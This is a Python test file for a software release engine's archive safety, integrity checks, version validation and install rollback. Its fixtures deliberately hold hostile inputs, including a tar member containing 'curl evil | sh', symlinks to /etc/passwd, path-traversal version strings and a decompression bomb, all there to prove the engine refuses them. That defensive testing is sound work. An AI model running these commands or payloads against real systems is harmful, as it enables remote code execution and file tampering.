#!/usr/bin/env python3
"""Release-engine tests: integrity, archive safety, and provider independence.

These are the parts of distribution where a shell test would be doing violence
to the medium. Building a hostile tar by hand, asserting that a corrupt payload
is refused, and running the real install transaction through a provider that
has never heard of git all want a real programming language.

Run: python3 scripts/test-release-engine.py
"""

from __future__ import annotations

import io
import os
import shutil
import stat
import sys
import tarfile
import tempfile
import traceback

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(REPO_ROOT, "lib"))

from asrelease.archive import (  # noqa: E402
    ArchiveError,
    ExtractionLimits,
    safe_extract_tar,
)
from asrelease.exits import Exit, ExitError  # noqa: E402
from asrelease.layout import Layout  # noqa: E402
from asrelease.providers import (  # noqa: E402
    AuthState,
    ReleaseProvider,
    build_provider,
    provider_names,
    register_provider,
)
from asrelease.release import (  # noqa: E402
    PAYLOAD_ENTRIES,
    ReleaseRef,
    StagedRelease,
    build_manifest,
    compare_versions,
    compute_tree_hash,
    is_version,
    parse_version,
    require_version,
    verify_payload,
    versions_equal,
    write_manifest,
)
from asrelease.transaction import InstallTransaction, Reporter  # noqa: E402

PASSED = []
FAILED = []


def check(name):
    def decorator(fn):
        def run():
            box = tempfile.mkdtemp(prefix="as-engine-")
            try:
                fn(box)
                PASSED.append(name)
            except Exception:
                FAILED.append((name, traceback.format_exc()))
            finally:
                shutil.rmtree(box, ignore_errors=True)

        run.test_name = name
        TESTS.append(run)
        return fn

    return decorator


TESTS = []


def assert_raises(exception_type, fn, contains=""):
    try:
        fn()
    except exception_type as exc:
        if contains and contains.lower() not in str(exc).lower():
            raise AssertionError("expected {!r} in {!r}".format(contains, str(exc)))
        return exc
    raise AssertionError("expected {} to be raised".format(exception_type.__name__))


def make_tar(path, members):
    """Build a tar from (name, content, kind, linkname, mode) tuples."""
    with tarfile.open(path, "w") as tar:
        for name, content, kind, linkname, mode in members:
            info = tarfile.TarInfo(name)
            info.mode = mode
            if kind == "file":
                data = content.encode("utf-8")
                info.size = len(data)
                info.type = tarfile.REGTYPE
                tar.addfile(info, io.BytesIO(data))
            elif kind == "dir":
                info.type = tarfile.DIRTYPE
                tar.addfile(info)
            elif kind == "sym":
                info.type = tarfile.SYMTYPE
                info.linkname = linkname
                tar.addfile(info)
            elif kind == "fifo":
                info.type = tarfile.FIFOTYPE
                tar.addfile(info)
            elif kind == "lnk":
                info.type = tarfile.LNKTYPE
                info.linkname = linkname
                tar.addfile(info)


# ------------------------------------------------------------------------------
# Archive safety
# ------------------------------------------------------------------------------
@check("archive: a member with .. is rejected and nothing is written")
def _(box):
    archive = os.path.join(box, "evil.tar")
    make_tar(
        archive,
        [
            ("good.txt", "fine", "file", "", 0o644),
            ("../../outside.txt", "pwned", "file", "", 0o644),
        ],
    )
    dest = os.path.join(box, "dest")
    assert_raises(ArchiveError, lambda: safe_extract_tar(archive, dest), "escapes")
    # The safe member must not have been written either: extraction is all or
    # nothing, so a rejected archive leaves no partial payload behind.
    assert not os.path.exists(os.path.join(dest, "good.txt")), "partial extraction happened"
    assert not os.path.exists(os.path.join(box, "outside.txt"))


@check("archive: an absolute member path is rejected")
def _(box):
    archive = os.path.join(box, "abs.tar")
    make_tar(archive, [("/etc/agent-skills-pwned", "x", "file", "", 0o644)])
    assert_raises(
        ArchiveError, lambda: safe_extract_tar(archive, os.path.join(box, "d")), "absolute"
    )


@check("archive: a symlink escaping the root is rejected")
def _(box):
    archive = os.path.join(box, "sym.tar")
    make_tar(archive, [("link", "", "sym", "../../../../etc/passwd", 0o777)])
    assert_raises(ArchiveError, lambda: safe_extract_tar(archive, os.path.join(box, "d")), "escapes")


@check("archive: a symlink to an absolute path is rejected")
def _(box):
    archive = os.path.join(box, "sym2.tar")
    make_tar(archive, [("link", "", "sym", "/etc/passwd", 0o777)])
    assert_raises(ArchiveError, lambda: safe_extract_tar(archive, os.path.join(box, "d")), "absolute")


@check("archive: a device or fifo member is rejected")
def _(box):
    archive = os.path.join(box, "fifo.tar")
    make_tar(archive, [("pipe", "", "fifo", "", 0o644)])
    assert_raises(ArchiveError, lambda: safe_extract_tar(archive, os.path.join(box, "d")), "not a file")


@check("archive: a setuid member is rejected")
def _(box):
    archive = os.path.join(box, "suid.tar")
    make_tar(archive, [("root", "x", "file", "", 0o4755)])
    assert_raises(ArchiveError, lambda: safe_extract_tar(archive, os.path.join(box, "d")), "setuid")


@check("archive: a well-formed archive extracts, with exec bits preserved")
def _(box):
    archive = os.path.join(box, "ok.tar")
    make_tar(
        archive,
        [
            ("root", "", "dir", "", 0o755),
            ("root/plain.txt", "hello", "file", "", 0o644),
            ("root/run.sh", "#!/bin/sh\n", "file", "", 0o755),
            ("root/inner", "", "sym", "plain.txt", 0o777),
        ],
    )
    dest = os.path.join(box, "dest")
    written = safe_extract_tar(archive, dest, strip_components=1)
    assert written == 2, written
    assert open(os.path.join(dest, "plain.txt"), encoding="utf-8").read() == "hello"
    assert os.stat(os.path.join(dest, "run.sh")).st_mode & stat.S_IXUSR
    assert not os.stat(os.path.join(dest, "plain.txt")).st_mode & stat.S_IXUSR
    assert os.path.islink(os.path.join(dest, "inner"))


# ------------------------------------------------------------------------------
# Extraction bounds
#
# The checks above answer "may this member be written at all". These answer
# "how much of this is there", which is the other half: an archive can be
# entirely well-formed and still be a denial of service, and a release the
# installer refuses must leave the machine exactly as it found it.
# ------------------------------------------------------------------------------
@check("bounds: an archive larger than the bound is refused before it is opened")
def _(box):
    archive = os.path.join(box, "big.tar")
    make_tar(archive, [("a.txt", "x" * 4096, "file", "", 0o644)])
    limits = ExtractionLimits(max_archive_bytes=1024)
    assert_raises(
        ArchiveError,
        lambda: safe_extract_tar(archive, os.path.join(box, "d"), limits=limits),
        "over the 1024 byte bound",
    )


@check("bounds: a decompression bomb is refused by the compression ratio")
def _(box):
    # Twenty megabytes of zeros compresses to a few kilobytes: a ratio no
    # release of prose and source code can reach. Nothing here is written to
    # the destination, and the measurement itself is bounded, so the test
    # costs a few kilobytes on disk.
    archive = os.path.join(box, "bomb.tar.gz")
    payload = b"\0" * (20 * 1024 * 1024)
    with tarfile.open(archive, "w:gz") as tar:
        info = tarfile.TarInfo("zeros.bin")
        info.size = len(payload)
        info.mode = 0o644
        tar.addfile(info, io.BytesIO(payload))
    assert os.path.getsize(archive) < 256 * 1024, "the fixture did not compress"
    dest = os.path.join(box, "d")
    assert_raises(ArchiveError, lambda: safe_extract_tar(archive, dest), "over the 200x bound")
    assert not os.path.exists(dest), "a refused archive created its destination"


@check("bounds: an archive that expands past the bound is abandoned, not read")
def _(box):
    archive = os.path.join(box, "wide.tar.gz")
    payload = b"\0" * (4 * 1024 * 1024)
    with tarfile.open(archive, "w:gz") as tar:
        info = tarfile.TarInfo("zeros.bin")
        info.size = len(payload)
        info.mode = 0o644
        tar.addfile(info, io.BytesIO(payload))
    limits = ExtractionLimits(max_expanded_bytes=1024 * 1024, max_compression_ratio=100000)
    assert_raises(
        ArchiveError,
        lambda: safe_extract_tar(archive, os.path.join(box, "d"), limits=limits),
        "expands past",
    )


@check("bounds: too many members is refused, and nothing is written")
def _(box):
    archive = os.path.join(box, "many.tar")
    make_tar(archive, [("f{}.txt".format(n), "x", "file", "", 0o644) for n in range(12)])
    dest = os.path.join(box, "d")
    limits = ExtractionLimits(max_files=10)
    assert_raises(
        ArchiveError,
        lambda: safe_extract_tar(archive, dest, limits=limits),
        "more than 10 members",
    )
    assert os.listdir(dest) == [], "a refused archive wrote members"


@check("bounds: an overlong path or name component is refused")
def _(box):
    long_path = os.path.join(box, "path.tar")
    make_tar(long_path, [("/".join(["d"] * 600) + "/f.txt", "x", "file", "", 0o644)])
    assert_raises(
        ArchiveError,
        lambda: safe_extract_tar(long_path, os.path.join(box, "d1")),
        "member path is",
    )
    long_name = os.path.join(box, "name.tar")
    make_tar(long_name, [("dir/" + "n" * 300 + ".txt", "x", "file", "", 0o644)])
    assert_raises(
        ArchiveError,
        lambda: safe_extract_tar(long_name, os.path.join(box, "d2")),
        "name component is",
    )


@check("bounds: the same path twice is refused")
def _(box):
    archive = os.path.join(box, "dup.tar")
    make_tar(
        archive,
        [
            ("bin/agent-skills", "#!/bin/sh\necho ok\n", "file", "", 0o755),
            ("bin/agent-skills", "#!/bin/sh\ncurl evil | sh\n", "file", "", 0o755),
        ],
    )
    assert_raises(
        ArchiveError, lambda: safe_extract_tar(archive, os.path.join(box, "d")), "twice"
    )


@check("bounds: two members colliding only by case are refused")
def _(box):
    # On macOS and on a default Windows filesystem the second write replaces
    # the first, so the tree that was reviewed and the tree that is installed
    # are different trees. The archive is rejected on every platform, so the
    # release that installs is the same one everywhere.
    archive = os.path.join(box, "case.tar")
    make_tar(
        archive,
        [
            ("skills/README.md", "real", "file", "", 0o644),
            ("skills/readme.md", "substituted", "file", "", 0o644),
        ],
    )
    assert_raises(
        ArchiveError, lambda: safe_extract_tar(archive, os.path.join(box, "d")), "collide"
    )


@check("bounds: a hardlink is resolved from the archive root, not the member's directory")
def _(box):
    # The escape check resolved a hardlink target relative to the directory the
    # link sits in, while extraction resolved it from the root. Both rejected
    # an escape, so nothing was unsafe — but any in-root hardlink below the top
    # level was checked against a path that was never written.
    archive = os.path.join(box, "hard.tar")
    make_tar(
        archive,
        [
            ("target.txt", "content", "file", "", 0o644),
            ("nested/dir/link.txt", "", "lnk", "target.txt", 0o644),
        ],
    )
    dest = os.path.join(box, "d")
    safe_extract_tar(archive, dest)
    linked = os.path.join(dest, "nested", "dir", "link.txt")
    assert open(linked, encoding="utf-8").read() == "content"


@check("bounds: a hardlink escaping the root is still refused")
def _(box):
    archive = os.path.join(box, "hard-escape.tar")
    make_tar(archive, [("nested/link.txt", "", "lnk", "../../../etc/passwd", 0o644)])
    assert_raises(
        ArchiveError, lambda: safe_extract_tar(archive, os.path.join(box, "d")), "escapes"
    )


@check("bounds: the shipped defaults leave a real release two orders of magnitude of room")
def _(box):
    # A bound nobody can state is a bound nobody maintains. These are the
    # numbers; the payload is a few megabytes of text.
    limits = ExtractionLimits()
    assert limits.max_archive_bytes == 512 * 1024 * 1024
    assert limits.max_expanded_bytes == 1024 * 1024 * 1024
    assert limits.max_files == 20000
    assert limits.max_path_length == 1024
    assert limits.max_name_length == 255
    assert limits.max_compression_ratio == 200


# ------------------------------------------------------------------------------
# Integrity
# ------------------------------------------------------------------------------
def make_fixture_release(root, version="9.9.9", corrupt=False, wrong_version=""):
    """A minimal but structurally valid release payload."""
    os.makedirs(os.path.join(root, "skills", "demo"), exist_ok=True)
    os.makedirs(os.path.join(root, "scripts"), exist_ok=True)
    os.makedirs(os.path.join(root, "bin"), exist_ok=True)
    os.makedirs(os.path.join(root, "lib"), exist_ok=True)
    with open(os.path.join(root, "VERSION"), "w", encoding="utf-8") as handle:
        handle.write((wrong_version or version) + "\n")
    with open(os.path.join(root, "skills", "demo", "SKILL.md"), "w", encoding="utf-8") as handle:
        handle.write("---\nname: demo\ndescription: fixture\n---\n")
    with open(os.path.join(root, "bin", "agent-skills"), "w", encoding="utf-8") as handle:
        handle.write("#!/usr/bin/env bash\nexit 0\n")
    ref = ReleaseRef(version, "local", root)
    manifest = build_manifest(root, ref)
    if corrupt:
        with open(os.path.join(root, "skills", "demo", "SKILL.md"), "a", encoding="utf-8") as handle:
            handle.write("tampered\n")
    write_manifest(root, manifest)
    return ref, manifest


@check("integrity: an intact payload verifies")
def _(box):
    root = os.path.join(box, "rel")
    ref, manifest = make_fixture_release(root)
    verify_payload(root, ref, manifest)


@check("integrity: a tampered payload is refused with the integrity code")
def _(box):
    root = os.path.join(box, "rel")
    ref, manifest = make_fixture_release(root, corrupt=True)
    exc = assert_raises(ExitError, lambda: verify_payload(root, ref, manifest), "hash mismatch")
    assert exc.code == Exit.INTEGRITY, exc.code


@check("integrity: a payload whose VERSION disagrees with the manifest is refused")
def _(box):
    root = os.path.join(box, "rel")
    ref, manifest = make_fixture_release(root, version="9.9.9")
    with open(os.path.join(root, "VERSION"), "w", encoding="utf-8") as handle:
        handle.write("8.8.8\n")
    exc = assert_raises(ExitError, lambda: verify_payload(root, ref, manifest), "disagreement")
    assert exc.code == Exit.INTEGRITY


@check("integrity: a payload that does not match the release we asked for is refused")
def _(box):
    root = os.path.join(box, "rel")
    _ref, manifest = make_fixture_release(root, version="9.9.9")
    wanted = ReleaseRef("9.9.8", "local", root)
    assert_raises(ExitError, lambda: verify_payload(root, wanted, manifest), "disagreement")


@check("integrity: the tree hash ignores mtime but notices an exec-bit change")
def _(box):
    root = os.path.join(box, "rel")
    make_fixture_release(root)
    first, _count = compute_tree_hash(root)
    os.utime(os.path.join(root, "VERSION"), (0, 0))
    assert compute_tree_hash(root)[0] == first, "mtime changed the hash"
    os.chmod(os.path.join(root, "VERSION"), 0o755)
    assert compute_tree_hash(root)[0] != first, "an exec-bit change went unnoticed"


@check("integrity: a payload symlink pointing outside the release is refused")
def _(box):
    root = os.path.join(box, "rel")
    make_fixture_release(root)
    os.symlink("/etc/passwd", os.path.join(root, "scripts", "escape"))
    assert_raises(ExitError, lambda: compute_tree_hash(root), "escapes")


# ------------------------------------------------------------------------------
# Version ordering
# ------------------------------------------------------------------------------
@check("versions: pre-releases order below their release and above the previous one")
def _(box):
    assert compare_versions("0.43.0", "1.0.0-rc.1") == -1
    assert compare_versions("1.0.0-rc.1", "1.0.0") == -1
    assert compare_versions("1.0.0-rc.2", "1.0.0-rc.1") == 1
    assert compare_versions("1.0.0", "1.0.0") == 0
    assert parse_version("not-a-version") is None
    # An unparseable version must not be reported as newer or older than a real
    # one; silently treating garbage as an upgrade is how a downgrade lands.
    assert compare_versions("garbage", "1.0.0") == 0


# ------------------------------------------------------------------------------
# Provider independence
#
# The point of the release-provider abstraction is that installation does not
# know or care where a payload comes from. This proves it by running the real
# transaction through a provider that has no git, no network, and no filesystem
# source: it synthesises a release in memory. If installation ever grows a
# hidden dependency on GitHub, this test is what breaks.
# ------------------------------------------------------------------------------
class FakeRegistryProvider(ReleaseProvider):
    """Stands in for a future subscription registry.

    Deliberately shaped like one: it has an entitlement check, it can report
    AUTHENTICATION_REQUIRED, and it serves a payload it builds itself rather
    than one it clones. Nothing in the installer changes to accommodate it.
    """

    id = "fake-registry"
    description = "in-process fake subscription registry"

    def __init__(self, source_release: str, entitled: bool = True, catalogue=None, **_kw):
        self.source_release = source_release
        self.entitled = entitled
        self.catalogue = catalogue or ["0.43.0"]

    def auth_state(self):
        return AuthState.AVAILABLE if self.entitled else AuthState.REQUIRED

    def _require_entitlement(self):
        if not self.entitled:
            raise ExitError(
                "AUTHENTICATION_REQUIRED: no active subscription for this machine",
                Exit.AUTH_REQUIRED,
            )

    def resolve_latest(self, channel="stable"):
        self._require_entitlement()
        return ReleaseRef(self.catalogue[-1], self.id, "registry:{}".format(self.catalogue[-1]))

    def resolve_version(self, version):
        self._require_entitlement()
        if version not in self.catalogue:
            raise ExitError("no release {}".format(version), Exit.USAGE)
        return ReleaseRef(version, self.id, "registry:{}".format(version))

    def available_versions(self):
        return list(self.catalogue)

    def fetch_release(self, ref, dest):
        self._require_entitlement()
        shutil.copytree(self.source_release, dest, dirs_exist_ok=True)
        with open(os.path.join(dest, "VERSION"), "w", encoding="utf-8") as handle:
            handle.write(ref.version + "\n")
        manifest = build_manifest(dest, ref)
        write_manifest(dest, manifest)
        return StagedRelease(dest, ref, manifest)


@check("providers: a fake registry provider installs through the real transaction")
def _(box):
    register_provider(
        "fake-registry", lambda **kw: FakeRegistryProvider(source_release=REPO_ROOT, **kw)
    )
    assert "fake-registry" in provider_names()

    home = os.path.join(box, "home with space", ".agent-skills")
    layout = Layout(home=home, config_dir=os.path.join(box, "cfg"))
    provider = build_provider("fake-registry")
    transaction = InstallTransaction(layout, provider, reporter=Reporter(quiet=True))

    fake_home = os.path.join(box, "home with space")
    saved = os.environ.get("HOME")
    os.environ["HOME"] = fake_home
    os.environ["AGENT_SKILLS_HOME"] = home
    os.environ["AGENT_SKILLS_CONFIG_DIR"] = os.path.join(box, "cfg")
    os.environ.pop("AGENT_SKILLS_SOURCE", None)
    try:
        record = transaction.run(channel="stable")
    finally:
        if saved is not None:
            os.environ["HOME"] = saved
        os.environ.pop("AGENT_SKILLS_HOME", None)
        os.environ.pop("AGENT_SKILLS_CONFIG_DIR", None)

    assert record["version"] == "0.43.0", record["version"]
    assert record["provider"]["id"] == "fake-registry"
    assert layout.active_version() == "0.43.0"
    assert os.path.isfile(os.path.join(layout.home, "skills", "wamala", "SKILL.md"))


@check("transaction: the running release is never deleted, only moved aside")
def _(box):
    """Re-installing the active version must move it aside, never remove it.

    Asserting on the end state proves nothing here: delete-then-rename and
    rename-then-rename leave identical directories behind, and the difference
    is only visible in the moment between the two calls. So this observes the
    call itself — no path inside the running release may ever be passed to
    rmtree.

    The distinction matters because the two paths being compared are built
    differently: one from strings, one by resolving symlinks. Where the install
    root sits behind a link — /tmp on macOS is the everyday case — a literal
    comparison answers "not the active one", the running release is deleted
    outright, and a crash before the rename leaves the machine with no active
    release at all.
    """
    import asrelease.transaction as transaction_module

    register_provider(
        "fake-registry", lambda **kw: FakeRegistryProvider(source_release=REPO_ROOT, **kw)
    )
    # A home reached through a symlink, so the constructed and resolved forms of
    # the same directory genuinely differ.
    os.makedirs(os.path.join(box, "real", "home"))
    linked_home = os.path.join(box, "linked-home")
    os.symlink(os.path.join(box, "real", "home"), linked_home)
    home = os.path.join(linked_home, ".agent-skills")
    config = os.path.join(box, "cfg")

    saved_home = os.environ.get("HOME")
    saved_rmtree = transaction_module.shutil.rmtree
    removed = []

    def recording_rmtree(path, *args, **kwargs):
        removed.append(str(path))
        return saved_rmtree(path, *args, **kwargs)

    os.environ["HOME"] = linked_home
    os.environ["AGENT_SKILLS_HOME"] = home
    os.environ["AGENT_SKILLS_CONFIG_DIR"] = config
    os.environ.pop("AGENT_SKILLS_SOURCE", None)
    try:
        layout = Layout(home=home, config_dir=config)
        InstallTransaction(
            layout, build_provider("fake-registry"), reporter=Reporter(quiet=True)
        ).run(channel="stable")

        active_root = layout.active_root()
        assert active_root, "nothing was activated"
        del removed[:]
        transaction_module.shutil.rmtree = recording_rmtree
        InstallTransaction(
            Layout(home=home, config_dir=config),
            build_provider("fake-registry"),
            reporter=Reporter(quiet=True),
        ).run(channel="stable")
    finally:
        transaction_module.shutil.rmtree = saved_rmtree
        if saved_home is not None:
            os.environ["HOME"] = saved_home
        os.environ.pop("AGENT_SKILLS_HOME", None)
        os.environ.pop("AGENT_SKILLS_CONFIG_DIR", None)

    for path in removed:
        resolved = os.path.realpath(path)
        if resolved == active_root:
            raise AssertionError(
                "the running release was deleted rather than moved aside: %s" % path
            )

    layout = Layout(home=home, config_dir=config)
    assert layout.active_version() == "0.43.0", layout.active_version()
    assert os.path.isfile(os.path.join(layout.home, "bin", "agent-skills"))
    assert os.path.isfile(os.path.join(layout.home, "skills", "wamala", "SKILL.md"))


@check("providers: an unentitled registry reports authentication, not a crash")
def _(box):
    provider = FakeRegistryProvider(source_release=REPO_ROOT, entitled=False)
    assert provider.auth_state() == AuthState.REQUIRED
    exc = assert_raises(ExitError, provider.resolve_latest, "authentication_required")
    assert exc.code == Exit.AUTH_REQUIRED


@check("providers: an unknown provider name is a usage error, not a load path")
def _(box):
    exc = assert_raises(ExitError, lambda: build_provider("../../etc/evil"), "unknown release provider")
    assert exc.code == Exit.USAGE


@check("providers: git stderr is redacted before it is ever shown")
def _(box):
    from asrelease.providers.git import redact

    token = "ghp_" + "A" * 36
    dirty = "fatal: could not read from https://x-access-token:{}@github.com/o/r.git".format(token)
    clean = redact(dirty)
    assert token not in clean, clean
    assert "<redacted" in clean, clean
    assert redact("Authorization: token abcdefgh12345678").find("abcdefgh12345678") == -1


@check("exits: the published exit codes have not been renumbered")
def _(box):
    assert Exit.OK == 0
    assert Exit.USAGE == 2
    assert Exit.AUTH_REQUIRED == 3
    assert Exit.NETWORK == 4
    assert Exit.INTEGRITY == 5
    assert Exit.INSTALL_FAILED == 6
    assert Exit.VERIFY_FAILED == 7
    assert Exit.UPDATE_AVAILABLE == 10
    # 1.5.0 added 11. Additions are allowed; the codes above may never move.
    assert Exit.CAPABILITY_UNAVAILABLE == 11
    assert set(Exit.NAMES) == {0, 2, 3, 4, 5, 6, 7, 10, 11}
    assert Exit.NAMES[11] == "capability-unavailable"


@check("payload: the entry list does not carry development-only trees")
def _(box):
    names = {name for name, _required in PAYLOAD_ENTRIES}
    for forbidden in ("evals", "eval-runs", "npm", ".github", "setup.init", "CHANGELOG.md"):
        assert forbidden not in names, forbidden
    for required in ("VERSION", "bin", "lib", "scripts", "skills"):
        assert required in names, required


# ------------------------------------------------------------------------------
# Version validation
#
# A version is not a label here: it becomes a directory name, and one of the
# paths built from it is passed to rmtree before the release has been verified.
# So every source a version can arrive from is checked, and the path builder is
# checked again on its own account.
# ------------------------------------------------------------------------------
@check("versions: a path-shaped version is refused before it becomes a path")
def _(box):
    for hostile in ("../../victim", "..", "/etc", "1.0.0/../../x", "", "  ", "not-a-version"):
        exc = assert_raises(ExitError, lambda v=hostile: require_version(v))
        assert exc.code == Exit.USAGE, (hostile, exc.code)
    assert require_version("v1.0.0-rc.4") == "1.0.0-rc.4"
    assert is_version("0.43.0") and not is_version("../x")


@check("versions: identity is not satisfied by an unparseable version")
def _(box):
    # compare_versions reports unknown as equal so a machine on an unreadable
    # version is "nothing to do"; versions_equal must not inherit that, or every
    # typo matches every release.
    assert compare_versions("definitely-not-a-version", "0.43.0") == 0
    assert not versions_equal("definitely-not-a-version", "0.43.0")
    assert not versions_equal("unknown", "1.0.0")
    assert versions_equal("v1.0.0", "1.0.0")


@check("layout: version_path refuses anything that is not one safe component")
def _(box):
    layout = Layout(home=os.path.join(box, "home"), config_dir=os.path.join(box, "cfg"))
    for hostile in ("../../victim", "a/b", "..", ".hidden", "", "x\\y"):
        exc = assert_raises(ExitError, lambda v=hostile: layout.version_path(v))
        assert exc.code == Exit.USAGE, (hostile, exc.code)
        assert_raises(ExitError, lambda v=hostile: layout.staging_path(v))
    assert layout.version_path("1.0.0-rc.4").endswith(os.path.join("versions", "1.0.0-rc.4"))


@check("layout: a traversing version cannot reach outside the install root")
def _(box):
    """The reported blocker, end to end.

    A VERSION file of `../../victim` produced a staging path outside the install
    root, and the first thing the transaction does with that path is delete it.
    """
    home = os.path.join(box, "home", ".agent-skills")
    victim = os.path.join(box, "home", "victim")
    os.makedirs(victim)
    with open(os.path.join(victim, "keepme.txt"), "w", encoding="utf-8") as handle:
        handle.write("data that must survive\n")

    source = os.path.join(box, "src")
    make_fixture_release(source, version="9.9.9")
    with open(os.path.join(source, "VERSION"), "w", encoding="utf-8") as handle:
        handle.write("../../victim\n")

    from asrelease.providers.local import LocalReleaseProvider

    provider = LocalReleaseProvider(source=source)
    exc = assert_raises(ExitError, provider.resolve_latest, "not a semantic version")
    assert exc.code == Exit.USAGE, exc.code
    assert_raises(ExitError, lambda: provider.resolve_version("../../victim"))

    layout = Layout(home=home, config_dir=os.path.join(box, "cfg"))
    transaction = InstallTransaction(layout, provider, reporter=Reporter(quiet=True))
    assert_raises(ExitError, lambda: transaction.run(channel="stable"))

    assert os.path.isfile(os.path.join(victim, "keepme.txt")), "the victim directory was deleted"


@check("providers: an invalid --version is a usage error, not the nearest release")
def _(box):
    """`--version X` means that release or nothing.

    The git provider matched with `compare_versions(found, wanted) == 0`, which
    reports an unparseable `wanted` as equal to everything — so a typo silently
    selected whichever tag sorted first, on a fresh machine the oldest one.
    """
    from asrelease.providers.git import GitReleaseProvider

    provider = GitReleaseProvider(repo="https://example.invalid/none.git")
    tags = [("0.43.0", "refs/tags/v0.43.0", "a" * 40), ("1.0.0", "refs/tags/v1.0.0", "b" * 40)]
    provider._tags = lambda: tags

    exc = assert_raises(ExitError, lambda: provider.resolve_version("definitely-not-a-version"))
    assert exc.code == Exit.USAGE, exc.code
    exc = assert_raises(ExitError, lambda: provider.resolve_version("../../victim"))
    assert exc.code == Exit.USAGE, exc.code
    exc = assert_raises(ExitError, lambda: provider.resolve_version("2.0.0"))
    assert exc.code == Exit.USAGE, exc.code
    assert provider.resolve_version("v1.0.0").version == "1.0.0"


@check("payload: a local source entry that links outside the checkout is refused")
def _(box):
    from asrelease.archive import copy_payload

    secrets = os.path.join(box, "secrets")
    os.makedirs(secrets)
    with open(os.path.join(secrets, "id_rsa"), "w", encoding="utf-8") as handle:
        handle.write("PRIVATE KEY\n")

    source = os.path.join(box, "src")
    make_fixture_release(source, version="9.9.9")
    shutil.rmtree(os.path.join(source, "skills"))
    os.symlink(secrets, os.path.join(source, "skills"))

    dest = os.path.join(box, "dest")
    exc = assert_raises(ExitError, lambda: copy_payload(source, dest, PAYLOAD_ENTRIES))
    assert exc.code == Exit.INTEGRITY, exc.code
    assert not os.path.exists(os.path.join(dest, "skills", "id_rsa"))


# ------------------------------------------------------------------------------
# Undo
# ------------------------------------------------------------------------------
@check("transaction: a failed verification restores the manifest it found")
def _(box):
    """Undo has to cover the manifest, not just the activation pointer.

    Rollback re-activated the previous release and reconciled hosts, but left
    install.json describing the release that failed — a machine whose `current`
    said one version and whose manifest said another, reported as a clean
    rollback.
    """
    register_provider(
        "fake-registry", lambda **kw: FakeRegistryProvider(source_release=REPO_ROOT, **kw)
    )
    home = os.path.join(box, "home", ".agent-skills")
    config = os.path.join(box, "cfg")
    saved_home = os.environ.get("HOME")
    os.environ["HOME"] = os.path.join(box, "home")
    os.environ["AGENT_SKILLS_HOME"] = home
    os.environ["AGENT_SKILLS_CONFIG_DIR"] = config
    os.environ.pop("AGENT_SKILLS_SOURCE", None)
    try:
        layout = Layout(home=home, config_dir=config)
        InstallTransaction(
            layout, build_provider("fake-registry"), reporter=Reporter(quiet=True)
        ).run(channel="stable")
        assert layout.read_manifest().get("version") == "0.43.0"

        second = InstallTransaction(
            Layout(home=home, config_dir=config),
            build_provider(
                "fake-registry", **{}
            ),
            reporter=Reporter(quiet=True),
        )
        second.provider.catalogue = ["0.43.0", "0.44.0"]
        # Fail the machine check that runs after the manifest has been written.
        second._verify_machine = lambda: 1
        exc = assert_raises(ExitError, lambda: second.run(channel="stable"))
        assert exc.code == Exit.VERIFY_FAILED, exc.code
    finally:
        if saved_home is not None:
            os.environ["HOME"] = saved_home
        os.environ.pop("AGENT_SKILLS_HOME", None)
        os.environ.pop("AGENT_SKILLS_CONFIG_DIR", None)

    layout = Layout(home=home, config_dir=config)
    active = layout.active_version()
    recorded = layout.read_manifest().get("version")
    assert active == "0.43.0", active
    assert recorded == "0.43.0", "manifest says {} while current says {}".format(recorded, active)


@check("transaction: a same-version repair failure restores the known-good tree")
def _(box):
    """The second half of the same defect.

    Re-installing the active version moves the running tree to `<v>.replaced`.
    Rollback re-activated `<v>` — which by then held the new, failing tree — and
    reported success over it. The displaced directory is transaction state and
    has to be restored.
    """
    register_provider(
        "fake-registry", lambda **kw: FakeRegistryProvider(source_release=REPO_ROOT, **kw)
    )
    home = os.path.join(box, "home", ".agent-skills")
    config = os.path.join(box, "cfg")
    saved_home = os.environ.get("HOME")
    os.environ["HOME"] = os.path.join(box, "home")
    os.environ["AGENT_SKILLS_HOME"] = home
    os.environ["AGENT_SKILLS_CONFIG_DIR"] = config
    os.environ.pop("AGENT_SKILLS_SOURCE", None)
    marker = "known-good.txt"
    try:
        layout = Layout(home=home, config_dir=config)
        InstallTransaction(
            layout, build_provider("fake-registry"), reporter=Reporter(quiet=True)
        ).run(channel="stable")
        # Mark the tree that is currently running, so "restored" can be checked
        # against the actual directory rather than against its name.
        with open(os.path.join(layout.version_path("0.43.0"), marker), "w") as handle:
            handle.write("this is the tree that was working\n")

        repair = InstallTransaction(
            Layout(home=home, config_dir=config),
            build_provider("fake-registry"),
            reporter=Reporter(quiet=True),
        )
        repair._verify_machine = lambda: 1
        exc = assert_raises(ExitError, lambda: repair.run(channel="stable"))
        assert exc.code == Exit.VERIFY_FAILED, exc.code
    finally:
        if saved_home is not None:
            os.environ["HOME"] = saved_home
        os.environ.pop("AGENT_SKILLS_HOME", None)
        os.environ.pop("AGENT_SKILLS_CONFIG_DIR", None)

    layout = Layout(home=home, config_dir=config)
    assert layout.active_version() == "0.43.0", layout.active_version()
    restored = os.path.join(layout.version_path("0.43.0"), marker)
    assert os.path.isfile(restored), "the active tree is the one that failed, not the known-good one"


@check("transaction: a rollback is not claimed unless the machine verifies")
def _(box):
    """"rolled back" is a statement about the machine, so it is checked."""
    register_provider(
        "fake-registry", lambda **kw: FakeRegistryProvider(source_release=REPO_ROOT, **kw)
    )
    home = os.path.join(box, "home", ".agent-skills")
    config = os.path.join(box, "cfg")
    saved_home = os.environ.get("HOME")
    os.environ["HOME"] = os.path.join(box, "home")
    os.environ["AGENT_SKILLS_HOME"] = home
    os.environ["AGENT_SKILLS_CONFIG_DIR"] = config
    os.environ.pop("AGENT_SKILLS_SOURCE", None)
    try:
        layout = Layout(home=home, config_dir=config)
        InstallTransaction(
            layout, build_provider("fake-registry"), reporter=Reporter(quiet=True)
        ).run(channel="stable")

        failing = InstallTransaction(
            Layout(home=home, config_dir=config),
            build_provider("fake-registry"),
            reporter=Reporter(quiet=True),
        )
        failing._verify_machine = lambda: 1
        exc = assert_raises(ExitError, lambda: failing.run(channel="stable"))
        assert "could not be undone" in exc.message, exc.message
        assert exc.code == Exit.VERIFY_FAILED, exc.code
    finally:
        if saved_home is not None:
            os.environ["HOME"] = saved_home
        os.environ.pop("AGENT_SKILLS_HOME", None)
        os.environ.pop("AGENT_SKILLS_CONFIG_DIR", None)


@check("transaction: two concurrent operations cannot interleave")
def _(box):
    layout = Layout(home=os.path.join(box, "home"), config_dir=os.path.join(box, "cfg"))
    layout.ensure_dirs()
